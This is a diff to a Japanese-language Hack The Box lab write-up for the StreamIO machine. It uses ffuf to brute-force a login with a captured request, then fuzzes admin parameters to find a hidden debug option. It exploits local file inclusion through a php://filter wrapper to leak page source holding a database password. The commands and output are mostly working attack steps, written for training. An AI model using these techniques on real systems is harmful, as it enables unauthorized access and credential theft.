@@ -358,9 +358,32 @@ yoshihide:66boysandgirls..
 └─$ cat vaild.txt | awk -F ':' {'print $2'} > pass.txt
 ```
 ffufのデフォルトのhttpsリクエストヘッダでは、うまくログインリクエストが処理されていなかったので  
-ブラウザ上でのhttpsリクエストをburpでキャプチャし、ffufで再利用  
+ブラウザ上でのhttpsリクエストをburpsuiteでキャプチャし、ffufで再利用  
 ログイン成功するクレデンシャルを発見した
 ```sh
+└─$ cat request                                       
+POST /login.php HTTP/1.1
+Host: streamio.htb
+Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://streamio.htb/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: https://streamio.htb
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+username=userFUZZ&password=passFUZZ
+
 └─$ ffuf -request request -w users.txt:userFUZZ -w pass.txt:passFUZZ -fr 'Login failed'
 
         /'___\  /'___\           /'___\       
@@ -408,4 +431,190 @@ ________________________________________________
     * userFUZZ: yoshihide
 
 :: Progress: [144/144] :: Job [1/1] :: 36 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+```
+ログイン成功
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_09.png">
+
+
+## STEP 5
+step2で怪しかったadminにアクセスできた  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_10.png">  
+curlで認証後のwebページにアクセスするために、step4時にburpsuiteでキャプチャしたcookieを使用  
+それぞれのリンクはphpのパラメータに関するものだった
+```sh
+└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -s https://streamio.htb/admin/index.php | grep 'href'
+~~~
+                                <a class="nav-link" href="?user=">User management</a>
+                                <a class="nav-link" href="?staff=">Staff management</a>
+                                <a class="nav-link" href="?movie=">Movie management</a>
+                                <a class="nav-link" href="?message=">Leave a message for admin</a>
+```
+各パラメータにfileインクルードの脆弱性はなさそうだった  
+リンクで確認できるパラメータ以外のパラメータの有無を調査したところ、debugを確認
+```sh
+└─$ ffuf -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -u 'https://streamio.htb/admin/index.php?FUZZ=' -c -fs 1678 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://streamio.htb/admin/index.php?FUZZ=
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Header           : Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 1678
+________________________________________________
+
+debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 417ms]
+movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 267ms]
+staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 269ms]
+user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 272ms]
+:: Progress: [6453/6453] :: Job [1/1] :: 132 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
+```
+ということでdebugパラメータにアクセス、変なメッセージ  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_11.png">  
+debugパラメータにはlfiの脆弱性を確認
+```sh
+└─$ ffuf -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -u 'https://streamio.htb/admin/index.php?debug=FUZZ' -c -fs 1712 -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://streamio.htb/admin/index.php?debug=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+ :: Header           : Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 1712
+________________________________________________
+
+C:/Windows/win.ini      [Status: 200, Size: 1804, Words: 95, Lines: 57, Duration: 483ms]
+C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 2577, Words: 262, Lines: 71, Duration: 493ms]
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 46280, Words: 8867, Lines: 719, Duration: 751ms]
+c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 2119, Words: 177, Lines: 66, Duration: 766ms]
+c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 2577, Words: 262, Lines: 71, Duration: 766ms]
+c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 19347, Words: 8602, Lines: 337, Duration: 768ms]
+c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 5395, Words: 717, Lines: 129, Duration: 769ms]
+c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 3070, Words: 534, Lines: 77, Duration: 769ms]
+c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1988, Words: 119, Lines: 54, Duration: 602ms]
+:: Progress: [236/236] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
+```
+index.phpのソースをlfiで確認したが確認できず  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_12.png">  
+しかしphpの機能であるラッパーをしようすると確認できた
+```sh
+└─$ curl -H "Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip" -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=index.php' 
+
+~~~
+                <div id="inc">
+                        this option is for developers onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==               </div>
+        </center>
+</body>
+</html>
+```
+デコード
+```php
+└─$ base64 -d base64_index.php 
+<?php
+define('included',true);
+session_start();
+if(!isset($_SESSION['admin']))
+{
+        header('HTTP/1.1 403 Forbidden');
+        die("<h1>FORBIDDEN</h1>");
+}
+$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
+$handle = sqlsrv_connect('(local)',$connection);
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+        <meta charset="utf-8">
+        <title>Admin panel</title>
+        <link rel = "icon" href="/images/icon.png" type = "image/x-icon">
+        <!-- Basic -->
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <!-- Mobile Metas -->
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <!-- Site Metas -->
+        <meta name="keywords" content="" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+        <!-- Custom styles for this template -->
+        <link href="/css/style.css" rel="stylesheet" />
+        <!-- responsive style -->
+        <link href="/css/responsive.css" rel="stylesheet" />
+
+</head>
+<body>
+        <center class="container">
+                <br>
+                <h1>Admin panel</h1>
+                <br><hr><br>
+                <ul class="nav nav-pills nav-fill">
+                        <li class="nav-item">
+                                <a class="nav-link" href="?user=">User management</a>
+                        </li>
+                        <li class="nav-item">
+                                <a class="nav-link" href="?staff=">Staff management</a>
+                        </li>
+                        <li class="nav-item">
+                                <a class="nav-link" href="?movie=">Movie management</a>
+                        </li>
+                        <li class="nav-item">
+                                <a class="nav-link" href="?message=">Leave a message for admin</a>
+                        </li>
+                </ul>
+                <br><hr><br>
+                <div id="inc">
+                        <?php
+                                if(isset($_GET['debug']))
+                                {
+                                        echo 'this option is for developers only';
+                                        if($_GET['debug'] === "index.php") {
+                                                die(' ---- ERROR ----');
+                                        } else {
+                                                include $_GET['debug'];
+                                        }
+                                }
+                                else if(isset($_GET['user']))
+                                        require 'user_inc.php';
+                                else if(isset($_GET['staff']))
+                                        require 'staff_inc.php';
+                                else if(isset($_GET['movie']))
+                                        require 'movie_inc.php';
+                                else 
+                        ?>
+                </div>
+        </center>
+</body>
+</html>
 ```
